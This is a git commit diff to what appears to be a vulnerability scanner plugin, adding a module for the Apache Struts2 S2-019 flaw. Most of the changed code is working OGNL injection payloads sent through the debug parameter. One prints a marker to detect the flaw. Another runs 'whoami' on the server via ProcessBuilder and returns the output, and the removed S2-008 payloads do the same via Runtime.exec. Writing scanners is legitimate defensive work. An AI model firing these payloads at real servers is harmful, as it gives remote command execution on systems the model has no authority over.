ff7f1ae1aa253cf87f6846d62a2f213c0de42eae
x1a0t <ch4ffee@gmail.com>
2020-10-29 11:59:30 +0800

    add S2-019 vul

--- src/main/java/module/java/vul/S2_019.java
+++ src/main/java/module/java/vul/S2_019.java
@@ -6,46 +6,29 @@ import module.Util;
 import java.net.URLEncoder;
 import java.util.Arrays;
 
-public class S2_008 extends IModule {
+public class S2_019 extends IModule {
     public String randomMark = Util.getRandomString(16);
     public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
 
     public String poc =
+            "debug=command&expression=" +
+            "#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()," +
+            "#out.print('" + injectMark[0] + "')," +
+            "#out.print('" + injectMark[1] + "')," +
+            "#out.flush()," +
+            "#out.close()";
+    public String exp =
         "debug=command&expression=" +
-        "(" +
-        "#_memberAccess.allowStaticMethodAccess=true," +
-        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
-        "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
-        "#out.getWriter().print(\"" + injectMark[0] + "\")," +
-        "#out.getWriter().print(\"" + injectMark[1] + "\")," +
-        "#out.getWriter().flush()," +
-        "#out.getWriter().close()" +
-        ")";
-    public String exp1 =
-        "debug=command&expression=" +
-        "(" +
-        "#_memberAccess.allowStaticMethodAccess=true," +
-        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
-        "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
-        "#cmd=\"whoami\"," +
-        "#ret=@java.lang.Runtime@getRuntime().exec(#cmd)," +
-        "#data=new java.io.DataInputStream(#ret.getInputStream())," +
-        "#res=new byte[4]," +
-        "#data.readFully(#res)," +
-        "#echo=new java.lang.String(#res)," +
-        "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
-        "#out.getWriter().print(#echo)," +
-        "#out.getWriter().flush()," +
-        "#out.getWriter().close()" +
-        ")";
-    public String exp2 =
-        "debug=command&expression=" +
-        "(" +
-        "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
-        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
-        "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
-        "@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())" +
-        ")";
+        "#a=(new java.lang.ProcessBuilder('whoami')).start()," +
+        "#b=#a.getInputStream()," +
+        "#c=new java.io.InputStreamReader(#b)," +
+        "#d=new java.io.BufferedReader(#c)," +
+        "#e=new char[50]," +
+        "#d.read(#e)," +
+        "#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()," +
+        "#out.print(new java.lang.String(#e))," +
+        "#out.flush()," +
+        "#out.close()";
 
     @Override
     public IScanIssue start() {
@@ -74,7 +57,7 @@ public class S2_008 extends IModule {
         String bodyText = new String(body);
         if (bodyText.contains(randomMark)) {
             this.iHttpRequestResponse = newHttpRequestResponse;
-            this.detail = URLEncoder.encode(exp1).replace("%3D", "=").replace("%26", "&");
+            this.detail = URLEncoder.encode(exp).replace("%3D", "=").replace("%26", "&");
             return creatCustomScanIssue();
         }
 
